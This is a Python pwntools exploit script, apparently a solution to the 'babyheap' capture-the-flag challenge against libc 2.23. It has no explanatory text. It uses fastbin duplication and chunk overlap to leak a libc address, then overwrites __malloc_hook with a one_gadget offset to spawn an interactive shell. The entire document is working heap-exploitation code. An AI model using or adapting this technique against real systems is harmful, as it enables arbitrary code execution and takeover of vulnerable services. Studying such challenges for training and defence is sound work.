from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
io = process("./babyheap")
libc = ELF("./libc-2.23.so")
elf = ELF("./babyheap")

def create(size):
    io.sendlineafter(b"Command: ",str(1))
    io.sendlineafter(b"Size: ",str(size))

def fill(idx,payload):
    io.sendlineafter(b"Command: ",str(2))
    io.sendlineafter(b"Index: ",str(idx))
    io.sendlineafter(b"Size: ",str(len(payload)))
    io.sendlineafter(b"Content: ",payload)

def free(idx):
    io.sendlineafter(b"Command: ",str(3))
    io.sendlineafter(b"Index: ",str(idx))

def dump(idx):
    io.sendlineafter(b"Command: ",str(4))
    io.sendlineafter(b"Index: ",str(idx))

def debug():
    gdb.attach(io)
    pause()

def fastbin_dup():
    create(0x10)    # chunk0
    create(0x10)    # chunk1
    create(0x10)    # chunk2
    create(0x10)    # chunk3
    create(0x80)    # chunk4
    free(1)
    free(2)
    payload = p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)
    payload+= p8(0x80)
    fill(0,payload)
    payload = p64(0)*3+p64(0x21)
    fill(3,payload)
    create(0x10)    # chunk1
    create(0x10)    # chunk2

def leak_libc():
    global libcbase,malloc_hook
    payload = p64(0)*3+p64(0x91)
    fill(3,payload)
    create(0x80)    # chunk5
    free(4)
    dump(2)
    io.recvuntil("Content: \n")
    leak_addr = u64(io.recv(6).ljust(0x08,b"\x00"))
    libcbase = leak_addr-88-0x10-libc.symbols["__malloc_hook"]
    malloc_hook = libcbase+libc.symbols["__malloc_hook"]
    print(hex(libcbase))
    print(hex(malloc_hook))

def pwn():
    create(0x60)    # chunk4
    free(4)
    payload = p64(malloc_hook-0x23)
    fill(2,payload)
    create(0x60)    # chunk4
    create(0x60)    # chunk6
    one_gadget = [0x4525a,0xef9f4,0xf0897]
    payload = b'a'*0x13+p64(libcbase+one_gadget[0])
    fill(6,payload)
    create(0x10)    # get_shell
    io.interactive()

if __name__=="__main__":
    fastbin_dup()
    leak_libc()
    pwn()
